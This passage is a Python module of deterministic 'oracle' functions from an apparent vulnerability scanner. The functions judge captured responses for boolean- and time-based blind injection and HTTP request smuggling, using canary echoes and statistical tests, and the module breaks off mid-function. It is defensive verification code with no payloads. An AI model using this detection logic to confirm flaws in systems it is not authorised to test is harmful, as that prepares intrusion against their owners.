"""
verify.oracles — pure, deterministic oracle functions.

Each oracle takes OBSERVED data (responses/state/output already collected by
someone else) and decides whether a real signal fired. Oracles are:

  * pure          — no I/O, no network, no clock, no randomness.
  * deterministic — same inputs, same OracleSignal, every time.
  * side-effect-free — they read, they judge, they return. They never send.

Confidence is calibrated so the verifier can gate on a single threshold.
Signal-combination inside an oracle uses a noisy-OR: independent corroborating
dimensions push confidence up, but no single weak dimension can dominate.
"""

from __future__ import annotations

import ast
import base64
import binascii
import difflib
import hashlib
import hmac
import ipaddress
import json
import math
import re
from collections import Counter
from dataclasses import dataclass
from html.parser import HTMLParser
from statistics import median
from typing import Any, Mapping, Sequence
from urllib.parse import urlsplit

from .models import OracleKind, OracleSignal

# HTML void elements never get an end tag — popped from the path stack on start.
_VOID_ELEMENTS = frozenset({
    "area", "base", "br", "col", "embed", "hr", "img", "input",
    "link", "meta", "param", "source", "track", "wbr",
})


# ---------------------------------------------------------------------------
# Response normalisation (differential oracle)
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class _Response:
    status: int | None
    body: str
    latency_ms: float | None


def _coerce_text(value: Any) -> str:
    if value is None:
        return ""
    if isinstance(value, bytes):
        return value.decode("utf-8", errors="replace")
    if isinstance(value, str):
        return value
    return str(value)


def _normalize_response(value: Any) -> _Response:
    """Accept a plain string/bytes body, or a mapping with any of
    {status|status_code, body|text|content, latency_ms|elapsed_ms}."""
    if isinstance(value, Mapping):
        status = value.get("status", value.get("status_code"))
        body = value.get("body", value.get("text", value.get("content", "")))
        latency = value.get("latency_ms", value.get("elapsed_ms"))
        return _Response(
            status=int(status) if status is not None else None,
            body=_coerce_text(body),
            latency_ms=float(latency) if latency is not None else None,
        )
    return _Response(status=None, body=_coerce_text(value), latency_ms=None)


# ---------------------------------------------------------------------------
# Structural (AST) response signatures — invariant to token noise
# ---------------------------------------------------------------------------


def _json_signature(obj: Any, prefix: str = "") -> set[tuple[str, str]]:
    """The set of (json-pointer path, value-TYPE) pairs in a JSON document.
    Records structure, not values — so a changed timestamp/nonce (same path,
    same type) is invisible, but a new/removed record (a new path) shows."""
    out: set[tuple[str, str]] = set()
    if isinstance(obj, dict):
        out.add((prefix or "/", "object"))
        for k in obj:
            out |= _json_signature(obj[k], f"{prefix}/{k}")
    elif isinstance(obj, list):
        out.add((prefix or "/", "array"))
        for i, v in enumerate(obj):
            out |= _json_signature(v, f"{prefix}/{i}")
    else:
        out.add((prefix or "/", type(obj).__name__))
    return out


class _TagPathCounter(HTMLParser):
    """Builds a multiset of ancestor-tag-paths (e.g. ``html>body>table>tr``) over
    a document, using stdlib parsing only. The multiset is invariant to text/
    attribute values, so token noise does not move it, but an added element does."""

    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self._stack: list[str] = []
        self.counter: Counter[str] = Counter()

    def handle_starttag(self, tag: str, attrs: object) -> None:
        self._stack.append(tag)
        self.counter[">".join(self._stack)] += 1
        if tag in _VOID_ELEMENTS:
            self._stack.pop()

    def handle_startendtag(self, tag: str, attrs: object) -> None:
        self._stack.append(tag)
        self.counter[">".join(self._stack)] += 1
        self._stack.pop()

    def handle_endtag(self, tag: str) -> None:
        if tag in self._stack:
            while self._stack and self._stack[-1] != tag:
                self._stack.pop()
            if self._stack:
                self._stack.pop()


def _parse_structure(body: str) -> tuple[str, Any]:
    """Return ('json', path-type set) or ('html', tag-path multiset). JSON is
    tried first; anything else is parsed as HTML with the stdlib parser (no
    third-party dependency). A parse failure degrades to ('text', None) so the
    caller can skip cleanly."""
    import json as _json

    text = body if isinstance(body, str) else _coerce_text(body)
    stripped = text.lstrip()
    if stripped[:1] in "{[":
        try:
            return "json", _json_signature(_json.loads(text))
        except (ValueError, TypeError):
            pass
    parser = _TagPathCounter()
    try:
        parser.feed(text)
        parser.close()
    except Exception:
        return "text", None
    if not parser.counter:
        return "text", None
    return "html", parser.counter


def structural_diff(baseline_body: Any, mutated_body: Any) -> float:
    """A structure-aware divergence score in [0, 1], invariant to token noise
    (CSRF tokens, nonces, timestamps) and sensitive to real change (an added
    record, an extra ``<tr>``, a new form). 0 = structurally identical.

    JSON: symmetric difference of (path, type) sets over their union. HTML:
    multiset difference of tag-paths over the total. Different document kinds
    (JSON vs HTML) score 1.0. Unparseable bodies score 0.0 (no structural
    claim — the lexical dimension still applies)."""
    kind_b, sig_b = _parse_structure(baseline_body)
    kind_m, sig_m = _parse_structure(mutated_body)
    if kind_b == "text" or kind_m == "text":
        return 0.0
    if kind_b != kind_m:
        return 1.0
    if kind_b == "json":
        union = sig_b | sig_m
        return (len(sig_b ^ sig_m) / len(union)) if union else 0.0
    # html multisets
    diff = sum((sig_b - sig_m).values()) + sum((sig_m - sig_b).values())
    total = sum(sig_b.values()) + sum(sig_m.values())
    return (diff / total) if total else 0.0


def _noisy_or(weights: list[float]) -> float:
    """Combine independent evidence weights: 1 - prod(1 - w). Clamped to 0.99
    so a deterministic oracle never claims certainty it cannot have."""
    product = 1.0
    for w in weights:
        product *= 1.0 - max(0.0, min(1.0, w))
    return min(0.99, 1.0 - product)


# ---------------------------------------------------------------------------
# 1. Differential response — boolean- and time-based blind signals
# ---------------------------------------------------------------------------


def differential_response_oracle(
    baseline: Any,
    mutated: Any,
    discriminator: Mapping[str, Any] | str | None = None,
) -> OracleSignal:
    """Distinguish two observed responses.

    For a boolean-based blind bug the "true" condition yields a materially
    different response than the "false"/baseline condition; this oracle
    quantifies that divergence lexically and structurally. For a time-based
    blind bug a latency delta over threshold is the signal.

    discriminator (all optional):
      dimensions          : subset of {status,length,lexical,latency,marker}
      length_threshold    : min fractional length change to count (default 0.05)
      lexical_threshold   : min 1-similarity to count (default 0.10)
      latency_threshold_ms: min added latency to count (default 1000)
      true_marker         : string that must appear in `mutated` but not baseline
      expect              : "differ" (default) or "same"
    """
    if isinstance(discriminator, str):
        disc: dict[str, Any] = {"dimensions": [discriminator]}
    else:
        disc = dict(discriminator or {})

    b = _normalize_response(baseline)
    m = _normalize_response(mutated)

    wanted = set(disc.get("dimensions") or {"status", "length", "lexical", "latency", "marker"})
    length_thr = float(disc.get("length_threshold", 0.05))
    lexical_thr = float(disc.get("lexical_threshold", 0.10))
    latency_thr = float(disc.get("latency_threshold_ms", 1000.0))
    structural_thr = float(disc.get("structural_threshold", 0.02))
    true_marker = disc.get("true_marker")

    dims: list[dict[str, Any]] = []

    if "status" in wanted and b.status is not None and m.status is not None:
        differs = b.status != m.status
        dims.append({"dim": "status", "differs": differs, "weight": 0.6 if differs else 0.0,
                     "detail": f"{b.status} -> {m.status}"})

    if "length" in wanted:
        lb, lm = len(b.body), len(m.body)
        ratio = abs(lb - lm) / max(lb, lm, 1)
        differs = ratio > length_thr
        dims.append({"dim": "length", "differs": differs,
                     "weight": min(1.0, ratio) if differs else 0.0,
                     "detail": f"{lb} vs {lm} bytes ({ratio:.2%})"})

    if "lexical" in wanted:
        sim = difflib.SequenceMatcher(None, b.body, m.body).ratio()
        diff = 1.0 - sim
        differs = diff > lexical_thr
        dims.append({"dim": "lexical", "differs": differs,
                     "weight": diff if differs else 0.0,
                     "detail": f"similarity {sim:.2%}"})

    if "structural" in wanted:
        # AST-level divergence: invariant to nonce/CSRF/timestamp noise, so a
        # page that merely reflects a per-request token does NOT read as a diff,
        # while an added record / DOM node does. Higher precision than lexical.
        score = structural_diff(b.body, m.body)
        differs = score > structural_thr
        dims.append({"dim": "structural", "differs": differs,
                     "weight": min(1.0, score) if differs else 0.0,
                     "detail": f"structural delta {score:.2%}"})

    if "latency" in wanted and b.latency_ms is not None and m.latency_ms is not None:
        delta = m.latency_ms - b.latency_ms
        differs = delta >= latency_thr
        dims.append({"dim": "latency", "differs": differs,
                     "weight": 0.7 if differs else 0.0,
                     "detail": f"+{delta:.0f} ms"})

    if "marker" in wanted and true_marker:
        present = true_marker in m.body and true_marker not in b.body
        dims.append({"dim": "marker", "differs": present,
                     "weight": 0.9 if present else 0.0,
                     "detail": f"true_marker {'present' if present else 'absent'}"})

    differing = [d for d in dims if d["differs"]]
    diff_conf = _noisy_or([d["weight"] for d in differing])

    expect = disc.get("expect", "differ")
    if expect == "same":
        fired = len(differing) == 0 and len(dims) > 0
        confidence = min(0.99, 1.0 - diff_conf) if fired else 0.0
        evidence = ("responses indistinguishable across "
                    + ", ".join(d["dim"] for d in dims)) if fired else (
            "responses diverge on " + ", ".join(d["dim"] for d in differing))
    else:
        fired = len(differing) > 0
        confidence = diff_conf if fired else 0.0
        evidence = ("responses diverge on "
                    + ", ".join(f"{d['dim']} ({d['detail']})" for d in differing)) if fired else (
            "responses indistinguishable")

    return OracleSignal(
        kind=OracleKind.DIFFERENTIAL_RESPONSE,
        fired=fired,
        confidence=confidence,
        evidence=evidence,
        observed={"dimensions": dims, "expect": expect},
    )


# ---------------------------------------------------------------------------
# 1a'. HTTP request-smuggling desync — a DIFFERENTIAL SECOND REQUEST on a
#      VIGIL-CONTROLLED connection (Wave-4.2; retires the A12 timing LEAD).
# ---------------------------------------------------------------------------
#
# Audit A12 (#269) demoted the request_smuggling signal to an UNCONFIRMED LEAD because it
# rested on TIMING: a CL.TE / TE.CL probe that HUNG longer than a control. Timing alone is
# a hypothesis, not proof — a normal origin awaiting an incomplete declared body delays
# identically (see scanner/smuggling.py's A12 note). This oracle replaces the timing
# discriminator with a DETERMINISTIC DIFFERENTIAL a normal origin cannot produce, over
# evidence VIGIL captured on connections it owns end-to-end. NO victim is ever poisoned:
# both the smuggle request and the follow-up second request are VIGIL's OWN, sent on
# VIGIL's OWN socket, so the "poisoned next request" is VIGIL's own.
#
# ``observed`` is the retained record the gated raw-socket re-drive
# (live/smuggling_redrive.py) captured — never a bool, never a latency:
#
#   * ``canary``   — a UNIQUE, high-entropy per-probe token VIGIL minted and embedded in
#                    the smuggled prefix of the FIRST (conflict) request (>= 12 alnum chars
#                    AND >= 2.5 bits/char so a substring match cannot be coincidental);
#   * ``technique``— the framing-conflict technique (CL.TE / TE.CL / an obfuscated TE / …);
#   * ``conflict`` — ``{channel, status, reason, body}`` of VIGIL's OWN SECOND request read
#                    on the connection whose FIRST request carried the framing conflict;
#   * ``control``  — ``{channel, status, reason, body}`` of the SAME second request read on
#                    a SECOND VIGIL-owned connection whose first request was the SAME bytes
#                    but WELL-FORMED (no CL/TE conflict). The ONLY variable between the two
#                    legs is the framing conflict.
#
# FIRE (an achieved desync, DIFFERENTIAL_RESPONSE, conf 0.95) iff ALL hold:
#   * the canary is a valid unique VIGIL token (shape + entropy);
#   * BOTH legs established a channel (a leg that read no response is INCONCLUSIVE, never a
#     desync and never a CLEAN);
#   * the unique canary is ECHOED in the CONFLICT leg's second response — the smuggled
#     prefix VIGIL embedded in the FIRST request leaked into VIGIL's OWN SECOND request's
#     response, which is possible only if the back-end treated the prefix as the start of
#     the next request on the socket (a desync);
#   * the unique canary is ABSENT from the CONTROL leg's second response — the identical
#     no-conflict burst is normal, so the echo is ATTRIBUTABLE to the framing conflict and
#     not to an endpoint that reflects the canary into every response.
#
# A plain mangled-method status (405/400/501) is RECORDED as corroboration but is NEVER
# sufficient on its own (red-pen: require the unique canary echoed) — a benign 405 for an
# unsupported method must not mint. Timing is not consulted at all. A benign / anti-smuggling
# front-end that normalises or rejects the conflict never leaks the canary (echo absent from
# BOTH legs) — no fire; with both channels established that is a channel-confirmed negative
# for THIS technique/origin (conclusive), which admission maps to INCONCLUSIVE because the
# branch is not clean_capable (a sound CLEAN of "no smuggling" is coverage-complete over
# every technique and front-end pair — see the branch's target_downgrade_rationale).

_SMUGGLING_MIN_CANARY_LEN = 12
_SMUGGLING_MIN_CANARY_ENTROPY = 2.5   # bits/char — a random alnum token clears ~4-6
_SMUGGLING_CANARY_RE = re.compile(r"^[A-Za-z0-9]{12,}$")
# Statuses a MANGLED request LINE produces when a leftover prefix prepends to the second
# request's method (e.g. "GPOSTGET /follow"). Corroboration ONLY — never a minting signal.
_SMUGGLING_MANGLED_STATUSES = frozenset({400, 405, 501, 502})


def _smuggling_signal(fired: bool, *, evidence: str, observed: dict, conf: float = 0.95,
                      conclusive: bool = False) -> OracleSignal:
    # Reuses the FROZEN DIFFERENTIAL_RESPONSE kind (already in _ALL_ORACLES) but is reached
    # ONLY via the verifier's `smuggling_desync` ctx key, which no benchmark/scan/engage
    # finding carries — so `make gate` stays byte-identical and oracle_version is untouched.
    # A fire is always decisive; a NON-fire is `conclusive` only for a channel-confirmed
    # negative (both legs answered, no canary leaked) — an undecidable / low-entropy /
    # no-channel non-fire is a LEAD/INCONCLUSIVE, never a CLEAN.
    return OracleSignal(kind=OracleKind.DIFFERENTIAL_RESPONSE, fired=fired,
                        confidence=(conf if fired else 0.0),
                        conclusive=(True if fired else conclusive),
                        evidence=evidence, observed=observed)


def _smuggling_leg(leg: Any) -> "dict | None":
    """Coerce one burst leg's retained record to ``{channel, status, reason, body}`` (pure).
    ``None`` when the leg is not a mapping (no observation to adjudicate)."""
    if not isinstance(leg, Mapping):
        return None
    status = leg.get("status")
    try:
        status = int(status) if status is not None else None
    except (TypeError, ValueError):
        status = None
    return {"channel": bool(leg.get("channel", False)), "status": status,
            "reason": _coerce_text(leg.get("reason")), "body": _coerce_text(leg.get("body"))}


def smuggling_desync_oracle(observed: Any) -> OracleSignal:
    """Fire when VIGIL's OWN second request on a connection whose first request carried a
    framing conflict is DETERMINISTICALLY CORRUPTED by a leftover smuggled prefix — proven by
    a UNIQUE per-probe canary echoed in the conflict leg's second response AND absent from an
    identical no-conflict control leg's second response. The re-verifiable, timing-free
    achieved-state proof of HTTP request smuggling (CWE-444). Pure + deterministic; never
    raises. See the module comment above for the full contract."""
    obs = observed if isinstance(observed, Mapping) else {}
    canary = _coerce_text(obs.get("canary")).strip()
    technique = _coerce_text(obs.get("technique")).strip() or "CL.TE"
    base = {"technique": technique, "canary_len": len(canary)}

    # 1. The canary must be a UNIQUE, high-entropy VIGIL token, or a substring match could be
    #    coincidental (a benign body containing the token). A weak/absent canary is a LEAD.
    if (len(canary) < _SMUGGLING_MIN_CANARY_LEN or not _SMUGGLING_CANARY_RE.match(canary)
            or _shannon_bits_per_char(canary) < _SMUGGLING_MIN_CANARY_ENTROPY):
        return _smuggling_signal(
            False, observed=base,
            evidence=(f"the per-probe canary must be a unique VIGIL token (>= {_SMUGGLING_MIN_CANARY_LEN} "
                      "alnum chars AND >= 2.5 bits/char) so a substring match cannot be coincidental — "
                      "cannot adjudicate a desync (LEAD)"))

    conflict = _smuggling_leg(obs.get("conflict"))
    control = _smuggling_leg(obs.get("control"))
    if conflict is None or control is None:
        return _smuggling_signal(
            False, observed=base,
            evidence="the conflict and/or the no-conflict control second-request record is missing — "
                     "no differential to adjudicate (inconclusive)")

    # 2. BOTH VIGIL-owned second requests must have established a channel — a leg that read no
    #    response examined nothing (INCONCLUSIVE, never a desync and never a CLEAN).
    if not conflict["channel"] or not control["channel"]:
        return _smuggling_signal(
            False, observed={**base, "conflict_channel": conflict["channel"],
                             "control_channel": control["channel"]},
            evidence="a burst leg established no channel (the second request read no response) — "
                     "cannot adjudicate the desync differential (inconclusive)")

    echo_conflict = canary in conflict["body"]
    echo_control = canary in control["body"]
    mangled = conflict["status"] in _SMUGGLING_MANGLED_STATUSES and conflict["status"] != control["status"]
    detail = {**base, "echo_in_conflict": echo_conflict, "echo_in_control": echo_control,
              "conflict_status": conflict["status"], "control_status": control["status"],
              "mangled_method_status": mangled}

    # 3. The canary echoing in the CONTROL leg (identical bytes, WELL-FORMED framing) means the
    #    endpoint reflects the canary into the second response regardless of the conflict — the
    #    echo is NOT attributable to a desync. REFUSE (LEAD), never mint.
    if echo_control:
        return _smuggling_signal(
            False, observed=detail,
            evidence="the unique canary also appears in the NO-CONFLICT control's second response — the "
                     "echo is not attributable to a framing desync (an endpoint reflecting it regardless) "
                     "(REFUSE)")

    # 4. No echo in the conflict leg's second response: the back-end did not leak the smuggled
    #    prefix — no desync on this technique/origin. Both channels answered ⇒ channel-confirmed
    #    negative (a benign / anti-smuggling front-end that normalises the conflict lands here).
    if not echo_conflict:
        return _smuggling_signal(
            False, conclusive=True, observed=detail,
            evidence=(f"the {technique} conflict burst's second response did NOT echo the unique canary "
                      "(and neither did the control) — the origin did not desync this technique; a plain "
                      f"mangled-method status ({conflict['status']}) alone does not mint; did not fire"))

    # 5. The unique canary leaked into VIGIL's OWN second request's response on the conflict
    #    socket but NOT on the identical well-formed control socket — the ONLY difference (the
    #    framing conflict) caused the back-end to treat the smuggled prefix as the start of the
    #    next request. An achieved desync.
    return _smuggling_signal(
        True, conf=0.95, observed=detail,
        evidence=(f"HTTP request smuggling ({technique}): a UNIQUE per-probe canary embedded in the smuggled "
                  "prefix of VIGIL's first (conflict) request was ECHOED in VIGIL's OWN second request's "
                  "response on that socket, yet is ABSENT from an identical no-conflict control second "
                  "response — the back-end treated the smuggled prefix as the start of the next request "
                  "(a desync), proven by the differential, not by timing"
                  + (f"; the second request's method was also mangled (status {conflict['status']})"
                     if mangled else "")))


# ---------------------------------------------------------------------------
# 1b. Timing — statistical time-based blind (a real hypothesis test)
# ---------------------------------------------------------------------------


def _normal_cdf(z: float) -> float:
    """Standard-normal CDF via erf (pure stdlib)."""
    return 0.5 * (1.0 + math.erf(z / math.sqrt(2.0)))


def _rank_average(values: Sequence[float]) -> tuple[list[float], list[int]]:
    """Average (fractional) ranks of ``values`` and the sizes of each tie group.

    Ties share the mean of the ranks they would occupy — the standard
    correction, so the Mann-Whitney statistic is exact under ties."""
    order = sorted(range(len(values)), key=lambda i: values[i])
    ranks = [0.0] * len(values)
    tie_sizes: list[int] = []
    i = 0
    n = len(values)
    while i < n:
        j = i
        while j + 1 < n and values[order[j + 1]] == values[order[i]]:
            j += 1
        avg = (i + j) / 2.0 + 1.0  # ranks are 1-based
        for k in range(i, j + 1):
            ranks[order[k]] = avg
        if j > i:
            tie_sizes.append(j - i + 1)
        i = j + 1
    return ranks, tie_sizes


def _mann_whitney(baseline: Sequence[float], treatment: Sequence[float]) -> tuple[float, float]:
    """One-sided Mann-Whitney U for H1: treatment stochastically GREATER than
    baseline. Returns (z, p_value) using the normal approximation with tie and
    continuity correction. p is the probability of a U this extreme under H0
    (no location shift). Small samples still get an honest — if conservative —
    normal-approximation p; there is no exact-distribution table here."""
    n1, n2 = len(baseline), len(treatment)
    if n1 == 0 or n2 == 0:
        return 0.0, 1.0
    ranks, tie_sizes = _rank_average(list(baseline) + list(treatment))
    r_treat = sum(ranks[n1:])
    u_treat = r_treat - n2 * (n2 + 1) / 2.0
    mu = n1 * n2 / 2.0
    n = n1 + n2
    tie_term = sum(t ** 3 - t for t in tie_sizes)
    var = (n1 * n2 / 12.0) * ((n + 1) - tie_term / (n * (n - 1))) if n > 1 else 0.0
    if var <= 0.0:
        # Zero variance: either everything tied (no signal) or perfectly
        # separated with n too small — treat as no usable statistic.
        return 0.0, 1.0
    sigma = math.sqrt(var)
    # continuity correction toward the null
    z = (u_treat - mu - 0.5) / sigma
    p = 1.0 - _normal_cdf(z)
    return z, p


def _hodges_lehmann(baseline: Sequence[float], treatment: Sequence[float]) -> float:
    """The Hodges-Lehmann estimator of the median shift (treatment - baseline):
    the median of all pairwise differences. A robust effect-size measure that
    resists outliers (one slow request cannot manufacture a shift)."""
    diffs = [t - b for t in treatment for b in baseline]
    return median(diffs) if diffs else 0.0


def timing_oracle(
    baseline_samples: Any,
    treatment_samples: Any,
    *,
    injected_ms: float | None = None,
    alpha: float = 0.01,
    effect_floor_fraction: float = 0.5,
    absolute_floor_ms: float = 250.0,
    min_samples: int = 5,
    dose: Mapping[str, Any] | None = None,
) -> OracleSignal:
    """Confirm a time-based blind vulnerability with a real hypothesis test.

    A single averaged comparison or a fixed latency threshold (what sqlmap/Burp
    largely do) false-positives under jitter and false-negatives under load.
    This fires only when ALL of the following hold, which together are robust to
    both:

      1. **Rank-sum test.** A one-sided Mann-Whitney U rejects H0 (no shift) at
         ``alpha`` — the delay-injected requests are stochastically slower, by a
         distribution-free test that does not assume Gaussian latencies.
      2. **Effect-size floor.** The Hodges-Lehmann median shift is at least
         ``effect_floor_fraction`` of the injected delay (or ``absolute_floor_ms``
         when the delay is unknown) — a statistically-significant-but-tiny shift
         (network drift) is refused.
      3. **Dose-response (optional).** When ``dose`` supplies a second treatment
         at a different delay, the observed shift must scale with the injected
         delay (e.g. SLEEP(2) ~= 2x SLEEP(1)) — a constant offset cannot fake
         this. ``dose = {"low_ms": .., "low_samples": [..], "high_ms": .., "high_samples": [..]}``.

    Deterministic and pure: given the same samples it returns the same signal.
    """
    base = [float(x) for x in (baseline_samples or [])]
    treat = [float(x) for x in (treatment_samples or [])]
    if len(base) < min_samples or len(treat) < min_samples:
        return OracleSignal(
            kind=OracleKind.TIMING, fired=False, confidence=0.0,
            evidence=f"insufficient samples ({len(base)}/{len(treat)}, need >= {min_samples} each)",
            observed={"n_baseline": len(base), "n_treatment": len(treat)},
        )

    z, p = _mann_whitney(base, treat)
    shift = _hodges_lehmann(base, treat)
    floor = (effect_floor_fraction * injected_ms) if injected_ms else absolute_floor_ms

    reject = p < alpha
    effect_ok = shift >= floor

    dose_ok = True
    dose_detail = ""
    dose_conf = 0.0
    if dose is not None:
        low = [float(x) for x in (dose.get("low_samples") or [])]
        high = [float(x) for x in (dose.get("high_samples") or [])]
        low_ms = float(dose.get("low_ms", 0.0) or 0.0)
        high_ms = float(dose.get("high_ms", 0.0) or 0.0)
        if len(low) >= min_samples and len(high) >= min_samples and low_ms > 0 and high_ms > low_ms:
            low_shift = _hodges_lehmann(base, low)
            high_shift = _hodges_lehmann(base, high)
            expected_ratio = high_ms / low_ms
            observed_ratio = (high_shift / low_shift) if low_shift > 0 else 0.0
            # The observed shift must actually SCALE with the injected delay. A
            # constant offset (a slow proxy) gives ratio ~1.0 regardless; a real
            # dose gives ~expected_ratio. Require the ratio to sit above the
            # halfway point between "no scaling" (1) and full scaling, and not
            # wildly overshoot — so ratio 1.0 is refused, ratio ~expected passes.
            lower = 1.0 + 0.5 * (expected_ratio - 1.0)
            upper = 1.5 * expected_ratio
            dose_ok = lower <= observed_ratio <= upper
            dose_conf = 0.9 if dose_ok else 0.0
            dose_detail = f"; dose ratio {observed_ratio:.2f} vs expected {expected_ratio:.2f}"
        else:
            dose_ok = True  # malformed dose spec: do not penalise, just don't corroborate

    fired = reject and effect_ok and dose_ok

    if not fired:
        why = []
        if not reject:
            why.append(f"rank-sum p={p:.4g} >= alpha={alpha}")
        if not effect_ok:
            why.append(f"median shift {shift:.0f}ms < floor {floor:.0f}ms")
        if not dose_ok:
            why.append("dose-response failed")
        return OracleSignal(
            kind=OracleKind.TIMING, fired=False, confidence=0.0,
            # Channel-confirmed negative: this branch is past the min-samples guard, so a
            # real hypothesis test ran over adequate paired latencies and did not detect a
            # shift — a decisive "no timing channel" clean (the insufficient-samples early
            # return above stays non-conclusive → inconclusive, as it had no usable test).
            conclusive=True,
            evidence="no timing signal: " + "; ".join(why),
            observed={"z": z, "p_value": p, "median_shift_ms": shift, "floor_ms": floor},
        )

    p_conf = min(0.9, 1.0 - p)
    eff_conf = min(0.85, shift / injected_ms) if injected_ms else min(0.85, shift / (floor * 2))
    confidence = _noisy_or([p_conf, eff_conf, dose_conf])
    return OracleSignal(
        kind=OracleKind.TIMING,
        fired=True,
        confidence=confidence,
        evidence=(
            f"delay-injected requests are slower (Mann-Whitney z={z:.2f}, p={p:.3g}); "
            f"median shift {shift:.0f}ms >= floor {floor:.0f}ms{dose_detail}"
        ),
        observed={
            "z": z, "p_value": p, "median_shift_ms": shift, "floor_ms": floor,
            "n_baseline": len(base), "n_treatment": len(treat), "dose_ok": dose_ok,
        },
    )


def _sprt_decision(
    signals: Any,
    *,
    alpha: float,
    beta: float,
    p1: float,
    p0: float,
) -> tuple[str | None, float, int, int, float, float]:
    """The Wald SEQUENTIAL PROBABILITY RATIO TEST core, factored out so more than one oracle can
    share the SAME sequential test (``boolean_inference_oracle`` and ``credential_stuffing_oracle``).

    ``signals`` is an ITERABLE of bools consumed LAZILY: the loop stops pulling from the iterable
    at the first boundary, so a generator that computes each Bernoulli signal on demand does no
    work past the decision (this keeps ``boolean_inference_oracle`` byte-identical to its old
    inline loop — the same per-round work, in the same order, stopping at the same round).

    Returns ``(decided, llr, n_used, n_signal, upper, lower)`` where ``decided`` is ``"confirm"``
    (LLR >= log((1-beta)/alpha)), ``"refute"`` (LLR <= log(beta/(1-alpha))), or ``None`` (no
    boundary reached — inconclusive, a non-fire, never a guess). Pure + deterministic."""
    upper = math.log((1.0 - beta) / alpha)
    lower = math.log(beta / (1.0 - alpha))
    llr = 0.0
    n_used = 0
    n_signal = 0
    decided: str | None = None
    for sig in signals:
        n_used += 1
        n_signal += 1 if sig else 0
        llr += math.log(p1 / p0) if sig else math.log((1.0 - p1) / (1.0 - p0))
        if llr >= upper:
            decided = "confirm"
            break
        if llr <= lower:
            decided = "refute"
            break
    return decided, llr, n_used, n_signal, upper, lower


def boolean_inference_oracle(
    probe_rounds: Any,
    *,
    alpha: float = 0.05,
    beta: float = 0.05,
    p1: float = 0.9,
    p0: float = 0.1,
    discriminator: Mapping[str, Any] | str | None = None,
) -> OracleSignal:
    """Confirm a boolean-blind vulnerability by a Wald SEQUENTIAL PROBABILITY
    RATIO TEST over repeated probes — robust to the nondeterministic backends
    (caching, load-dependent bodies, per-request tokens) that make a single
    true/false comparison produce Burp-style "Tentative" false positives.

    Each round carries three observed responses: a TRUE-clause response, and two
    FALSE-clause responses. The per-round Bernoulli signal is

        (TRUE differs from FALSE)  AND  (the two FALSE responses agree)

    — the first half is the boolean signal; the second is a *dynamic-page
    control* that a naive repeated-differential lacks. A real injection makes the
    true clause change the response while the false clause stays stable (signal
    1); a page that simply changes every request trips the control (signal 0), so
    it cannot masquerade as a bug.

    SPRT accumulates the log-likelihood ratio that the signal rate is ``p1``
    (vulnerable) vs ``p0`` (noise) and stops at the first boundary: LLR >=
    log((1-beta)/alpha) confirms; LLR <= log(beta/(1-alpha)) refutes; neither by
    the last round is inconclusive (a non-fire — never a guess). ``probe_rounds``
    is ``[{"true": resp, "false_a": resp, "false_b": resp}, ...]``.
    """
    def _round_signals():
        for r in (probe_rounds or []):
            if not isinstance(r, Mapping) or "true" not in r or "false_a" not in r or "false_b" not in r:
                continue
            across = differential_response_oracle(r["false_a"], r["true"], discriminator).fired
            within_same = not differential_response_oracle(r["false_a"], r["false_b"], discriminator).fired
            yield bool(across and within_same)

    decided, llr, n_used, signals, upper, lower = _sprt_decision(
        _round_signals(), alpha=alpha, beta=beta, p1=p1, p0=p0)

    observed = {
        "rounds_used": n_used, "signal_rounds": signals, "llr": llr,
        "upper": upper, "lower": lower, "decision": decided or "inconclusive",
    }
    if decided == "confirm":
        # confidence reflects the controlled type-I error rate of the test
        confidence = min(0.99, 1.0 - alpha)
        return OracleSignal(
            kind=OracleKind.BOOLEAN_INFERENCE, fired=True, confidence=confidence,
            evidence=(
                f"SPRT confirmed boolean inference in {n_used} round(s): "
                f"{signals} separable (true!=false, false stable), LLR={llr:.2f} >= {upper:.2f}"
            ),
            observed=observed,
        )
    reason = "refuted (indistinguishable)" if decided == "refute" else "inconclusive (no boundary reached)"
    # A REFUTE decision is a channel-confirmed negative: the SPRT accumulated enough
    # evidence to accept the null (no boolean channel) at the controlled type-II rate,
    # so it is a decisive "provably-tested-clean". Running out of rounds WITHOUT reaching
    # a boundary is genuinely inconclusive (never a clean), so it is NOT conclusive.
    return OracleSignal(
        kind=OracleKind.BOOLEAN_INFERENCE, fired=False, confidence=0.0,
        conclusive=(decided == "refute"),
        evidence=f"SPRT {reason} after {n_used} round(s): LLR={llr:.2f} in ({lower:.2f}, {upper:.2f})",
        observed=observed,
    )


def holm_correction(p_values: Sequence[float], alpha: float = 0.01) -> list[bool]:
    """Holm-Bonferroni step-down over ``m`` simultaneous timing tests (one per
    candidate parameter). Returns, per input p-value, whether it rejects at
    family-wise error rate ``alpha``. Probing many params at once inflates false
    positives; Holm controls that without the raw Bonferroni's loss of power."""
    m = len(p_values)
    if m == 0:
        return []
    order = sorted(range(m), key=lambda i: p_values[i])
    reject = [False] * m
    for rank, idx in enumerate(order):
        if p_values[idx] <= alpha / (m - rank):
            reject[idx] = True
        else:
            break  # step-down: once one fails to reject, all larger p-values do too
    return reject


# ---------------------------------------------------------------------------
# 2. Achieved state — an unauthorized record/state became reachable
# ---------------------------------------------------------------------------


def _resolve_operand(operand: Any, observed: Mapping[str, Any]) -> Any:
    """A predicate operand is either a variable reference ``{"var": "name"}``
    (looked up in the observed evidence) or a literal (str/int/list/...)."""
    if isinstance(operand, Mapping) and set(operand.keys()) == {"var"}:
        return observed.get(operand["var"])
    return operand


def _eval_predicate(pred: Any, observed: Mapping[str, Any]) -> tuple[bool, str]:
    """Evaluate one declarative predicate node over the observed evidence and
    return (holds, human-readable evidence). The predicate is a tiny, pure,
    JSON-serialisable AST — no code, so a certificate stays re-verifiable. Ops:
    all/any/not, eq/ieq, contains/icontains, in, min_len, gt/ge."""
    if not isinstance(pred, Mapping) or len(pred) != 1:
        raise ValueError(f"predicate node must be a single-op mapping, got {pred!r}")
    op, args = next(iter(pred.items()))

    if op == "all":
        results = [_eval_predicate(p, observed) for p in args]
        return all(r[0] for r in results), " AND ".join(f"({r[1]})" for r in results)
    if op == "any":
        results = [_eval_predicate(p, observed) for p in args]
        return any(r[0] for r in results), " OR ".join(f"({r[1]})" for r in results)
    if op == "not":
        r = _eval_predicate(args, observed)
        return (not r[0]), f"NOT({r[1]})"

    a = _resolve_operand(args[0], observed)
    if op in ("eq", "ieq", "contains", "icontains", "in", "min_len", "gt", "ge"):
        b = _resolve_operand(args[1], observed) if len(args) > 1 else None
    if op == "eq":
